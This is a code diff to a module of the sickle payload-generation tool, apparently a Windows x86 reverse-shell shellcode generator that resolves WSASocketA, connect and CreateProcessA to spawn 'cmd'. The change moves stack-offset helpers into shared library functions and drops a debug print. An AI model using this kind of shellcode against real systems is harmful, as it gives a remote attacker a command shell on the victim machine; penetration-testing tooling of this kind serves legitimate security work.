@@ -2,9 +2,13 @@ import sys
 import ctypes
 import struct
 
+from sickle.common.lib.generic.mparser import argument_check
+
 from sickle.common.lib.reversing.assembler import Assembler
 
-from sickle.common.lib.generic.mparser import argument_check
+from sickle.common.lib.programmer.instantiator import gen_offsets
+from sickle.common.lib.programmer.instantiator import init_sc_args
+from sickle.common.lib.programmer.instantiator import calc_stack_space
 
 from sickle.common.lib.generic.convert import port_str_to_htons
 from sickle.common.lib.generic.convert import from_str_to_xwords
@@ -86,71 +90,22 @@ class Shellcode():
             ]
         }
 
-
-        sc_args = {
-            # -------------- FUNCTIONS --------------
-            "LoadLibraryA"                  : 0x000,
-            "CreateProcessA"                : 0x000,
-            "TerminateProcess"              : 0x000,
-            "WSAStartup"                    : 0x000,
-            "WSASocketA"                    : 0x000,
-            "connect"                       : 0x000,
-            # -------------- VARIABLES --------------
-            "functionName"                  : 0x020,
+        sc_args = init_sc_args(self.dependencies)
+        sc_args.update({ 
             "wsaData"                       : 0x000,
             "name"                          : 0x010,
             "lpStartupInfo"                 : ctypes.sizeof(_STARTUPINFOA),
             "lpCommandLine"                 : len("cmd\x00"),
             "lpProcessInformation"          : 0x000,
-        }
+        })
 
-        # TODO: make work with x64 as well 
-        self.stack_space = self.calc_space(sc_args, 0x04)
+        self.stack_space = calc_stack_space(sc_args,
+                                            ctypes.sizeof(ctypes.c_uint32))
 
-        self.storage_offsets = self.init_args(sc_args)
+        self.storage_offsets = gen_offsets(sc_args,
+                                           Shellcode.arch)
 
         return
-
-    def init_args(self, sc_args):
-        """Initialize storage offsets for arguments used by the shellcode
-
-        TODO: make a standard lib for all archs
-        """
-
-        arg_start = 0x08
-        for var in sc_args:
-            # If we are dealing with a "BUFFER" we have to account for the amount of space
-            # the shellcode author expects to use. With this, we can adjust the index used
-            # by the next variable. This avoids future variables being corrupted
-            #
-            # TODO: Make buffer % 8 if the user supplies a bad value that can mess up alignment
-            alloc_space = sc_args[var]
-            sc_args[var] = arg_start
-
-            if alloc_space > 0x00:
-                space_used = sc_args[var]
-                arg_start += alloc_space
-            else:
-                arg_start += 0x04
-
-        return sc_args
-
-    def calc_space(self, sc_args, reg_space):
-        """Get the number of artguments used and return the stack space to be used by the shellcode
-
-        TODO: make a standard lib for all archs
-        """
-
-        space_needed = 0x08
-        sc_argc = len(sc_args)
-        if (sc_argc > 1):
-            space_needed += sc_argc * reg_space
-
-        for var in sc_args:
-            if sc_args[var] > 0x00:
-                space_needed += sc_args[var]
-
-        return space_needed
 
     def get_kernel32(self):
         """Generates stub for obtaining the base address of Kernel32.dll
@@ -448,8 +403,6 @@ call_TerminateProcess:
 
         shellcode += self.get_kernel32()
         shellcode += self.lookup_function()
-
-        print(shellcode)
 
         return shellcode
 
